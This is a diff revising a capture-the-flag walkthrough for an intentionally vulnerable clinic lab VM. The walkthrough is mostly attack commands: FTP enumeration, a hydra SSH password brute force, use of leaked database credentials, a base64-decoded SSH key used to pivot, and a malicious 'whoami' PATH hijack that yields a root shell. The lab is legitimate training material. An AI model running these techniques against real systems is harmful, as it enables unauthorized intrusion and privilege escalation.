@@ -15,7 +15,7 @@ explicit authorization to test.
 
 **Flags:**
 - `EASY_FLAG.txt` — found through anonymous FTP enumeration, no exploitation required.
-- `INTERMEDIATE_FLAG.txt` — found after gaining a low-privilege shell and pivoting through the database.
+- `INTERMEDIATE_FLAG.txt` — found immediately after gaining a low-privilege shell (the real challenge — pivoting through the database to a second account — sets up Part 5, not the flag itself).
 - `HARD_FLAG.txt` — found after privilege escalation to root.
 
 ---
@@ -27,7 +27,7 @@ explicit authorization to test.
 2. Copy `setup_brightsmile.sh` to the VM.
 3. Run it:
    ```bash
-   sudo chmod +x setup_brightsmile.sh
+   chmod +x setup_brightsmile.sh
    sudo ./setup_brightsmile.sh
    ```
 4. Snapshot the VM once the script finishes — this is your clean
@@ -68,7 +68,9 @@ Once connected:
 
 ```bash
 ftp> ls -R
-ftp> cd staff_notes
+ftp> cd patient_forms
+ftp> get README_intake_process.txt
+ftp> cd ../staff_notes
 ftp> get EASY_FLAG.txt
 ftp> get reminder_sync.sh.bak
 ftp> bye
@@ -76,6 +78,16 @@ ftp> bye
 
 - `ls -R` — recursively list all directories reachable from the FTP root, revealing `patient_forms/` and `staff_notes/`.
 - `get <file>` — download a file from the server to your local machine.
+
+Read the README you pulled from `patient_forms/`:
+
+```bash
+cat README_intake_process.txt
+```
+
+This names the front-desk account explicitly: *"Contact the front desk
+account (user: recept) if a scan goes missing..."* — this is where the
+`recept` username actually comes from; hold onto it for Part 2.
 
 Read the easy flag:
 
@@ -119,9 +131,9 @@ curl http://<target-ip>/db_config.php
   already in hand from the FTP backup file, which is the intended path.
 
 The DB credential alone doesn't get you a shell — MySQL is bound to
-`127.0.0.1` only. You need a way onto the box first. Brute-force the one
-username you have reason to suspect exists (front-desk staff would log in
-locally, not over FTP):
+`127.0.0.1` only. You need a way onto the box first. You already have the
+username from `README_intake_process.txt` (Part 1) — brute-force its
+password over SSH:
 
 ```bash
 sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
@@ -133,7 +145,7 @@ hydra -l recept -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
 - `ssh://<target-ip>` — target service and host.
 - `-t 4` — 4 parallel connection threads (keep this low against a lab VM).
 
-This should recover `recept:sunflower1` in a short wordlist run.
+This should recover `recept:twinkle` in a short wordlist run.
 
 ### 2b. Database-stored SSH key (lateral movement, exploited in Part 4)
 
@@ -153,11 +165,21 @@ SSH in with the cracked credential:
 
 ```bash
 ssh recept@<target-ip>
-# password: sunflower1
+# password: twinkle
 ```
 
-There's no flag directly in `recept`'s home yet — first confirm you can
-reach the database using the credential from the FTP-leaked backup script:
+Check your home directory — the setup script drops the intermediate flag
+here the moment you land this shell, no further exploitation needed to
+reach it:
+
+```bash
+cat ~/INTERMEDIATE_FLAG.txt
+```
+
+**🚩 INTERMEDIATE_FLAG captured.**
+
+Now confirm you can reach the local-only database using the credential
+from the FTP-leaked backup script — this is the setup for Part 4:
 
 ```bash
 mysql -u booking_app -p'Fl0ss_Daily!' brightsmile -e "SHOW TABLES;"
@@ -172,7 +194,7 @@ reachable by the booking app's own service account.
 
 ---
 
-## Part 4 – Lateral Movement / Intermediate Challenge
+## Part 4 – Lateral Movement
 
 Query the unexpected table:
 
@@ -194,31 +216,20 @@ chmod 600 clinicadmin_id_ed25519
 - `base64 -d` — decode the base64 text back into the original binary/text data (an OpenSSH private key, in this case).
 - `chmod 600` — SSH refuses to use a private key file with overly permissive permissions.
 
-Use the recovered key to log in as the lateral-movement target:
+Use the recovered key to log in as the lateral-movement target and
+confirm the pivot worked:
 
 ```bash
 ssh -i clinicadmin_id_ed25519 clinicadmin@<target-ip>
+id
 ```
 
 - `-i clinicadmin_id_ed25519` — use this file as the SSH private key instead of a password.
 
-Once logged in as `clinicadmin`, grab the second flag:
-
-```bash
-cat ~/INTERMEDIATE_FLAG.txt
-```
-
-Wait — this flag was actually placed in `recept`'s home directory by the
-setup script (it represents the insight that *credential reuse from the
-web app reaches further than the web app itself*, discovered while still
-acting as `recept`). If you don't see it in `clinicadmin`'s home, check
-back on your `recept` session:
-
-```bash
-cat /home/recept/INTERMEDIATE_FLAG.txt
-```
-
-**🚩 INTERMEDIATE_FLAG captured.**
+`clinicadmin`'s home has no flag of its own — landing this shell *is* the
+challenge. It sets you up for the actual root path in Part 5, which only
+`clinicadmin` can reach (the SUID binary check requires being logged in
+as that user).
 
 ---
 
@@ -257,43 +268,50 @@ strings /usr/local/bin/clinic-diagnostics | grep -E 'whoami|uptime'
 ```
 
 - `ls -l` — the `rws` in the owner permission bits confirms SUID root.
-- `strings ... | grep ...` — pull readable text out of the binary; if it
-  calls `system("whoami")` instead of `system("/usr/bin/whoami")`, it's
-  trusting your `$PATH` — a classic PATH-hijack setup.
+- `strings ... | grep ...` — pull readable text out of the binary; seeing
+  bare `whoami` and `uptime` (no leading `/usr/bin/`) confirms it resolves
+  these by searching `$PATH` rather than calling a fixed absolute path —
+  a classic PATH-hijack setup.
 
-Build a malicious `whoami` that spawns a shell instead, and put it earlier
-in your `$PATH`:
+Build a malicious `whoami` that spawns a privileged shell instead, and
+put it earlier in your `$PATH`:
 
 ```bash
 mkdir -p /tmp/evil
 cat > /tmp/evil/whoami <<'EOF'
-#!/bin/bash
-/bin/bash -p
+#!/bin/bash -p
+exec /bin/bash -p
 EOF
 chmod +x /tmp/evil/whoami
 export PATH=/tmp/evil:$PATH
 clinic-diagnostics
-```
-
-- `mkdir -p /tmp/evil` — a writable directory to host the fake binary.
-- The fake `whoami` script just drops you into a shell.
-- `/bin/bash -p` — the `-p` flag tells bash to preserve the elevated
-  (SUID) privileges instead of dropping them, which bash does by default
-  when it detects a UID/EUID mismatch.
-- `export PATH=/tmp/evil:$PATH` — prepend your directory so it's searched
-  before `/usr/bin`, meaning the SUID binary's unqualified `system("whoami")`
-  call finds your version first.
-- Running `clinic-diagnostics` now executes your fake `whoami` **with
-  root's effective UID**, because the real binary is SUID-root.
-
-Confirm you're root:
-
-```bash
 id
 ```
 
-You should see `uid=1002(clinicadmin) euid=0(root)` (or a full root shell
-if you also ran `/bin/bash -p` directly inside the script).
+- `mkdir -p /tmp/evil` — a writable directory to host the fake binary.
+- `#!/bin/bash -p` — the `-p` **must be part of the shebang line itself**,
+  not a separate line in the script body. Bash (like most shells) drops
+  elevated privileges the moment it starts if its effective UID doesn't
+  match its real UID, unless `-p` is passed at startup. Since the kernel
+  invokes the interpreter named in the shebang line directly, putting
+  `-p` there is what actually suppresses the auto-drop — adding it only
+  inside the script body would be too late, because privileges are
+  already gone by the time the first script line runs.
+- `exec /bin/bash -p` — replace the script's own process with a fresh
+  privileged interactive-capable bash, still preserving the inherited
+  root effective UID.
+- `export PATH=/tmp/evil:$PATH` — prepend your directory so it's searched
+  before `/usr/bin`, meaning the SUID binary's unqualified lookup for
+  `whoami` finds your version first.
+- Running `clinic-diagnostics` now executes your fake `whoami` **with
+  root's effective UID**, because the real binary is SUID-root and calls
+  it directly via `execlp()` with no intervening shell to strip that
+  privilege away.
+- `id` — run this last, inside the shell `clinic-diagnostics` just handed
+  you, to confirm the privilege escalation worked.
+
+You should see `uid=0(root) euid=0(root)` — you're now sitting in a full
+root shell.
 
 ---
 
@@ -305,7 +323,7 @@ By this point you should have all three:
 # Easy - via anonymous FTP, no exploitation
 cat EASY_FLAG.txt          # downloaded in Part 1
 
-# Intermediate - via leaked DB creds + base64-decoded SSH key
+# Intermediate - dropped in recept's home, captured in Part 3
 cat /home/recept/INTERMEDIATE_FLAG.txt
 
 # Hard - via SUID PATH hijack, as root
@@ -328,7 +346,7 @@ cat /root/HARD_FLAG.txt
    password wasn't directly useful over the network (MySQL was
    localhost-only), but it confirmed a credential pattern and pointed at
    a likely local account, which a short wordlist attack against SSH then
-   recovered (`recept` / `sunflower1`).
+   recovered (`recept` / `twinkle`).
 3. **Lateral movement — secrets stored in application data:** once local,
    the same leaked DB credential unlocked a `staff_credentials` table that
    had no legitimate reason to be reachable by the booking app's service
@@ -372,4 +390,4 @@ general-purpose machine. When you're done with the lab session:
 3. If you don't need it again, delete the VM and its virtual disk
    entirely rather than repurposing it.
 4. Rotate/discard any credentials you typed into other tools while
-   practicing (e.g., don't reuse `sunflower1` or `Fl0ss_Daily!` anywhere real).
+   practicing (e.g., don't reuse `twinkle` or `Fl0ss_Daily!` anywhere real).
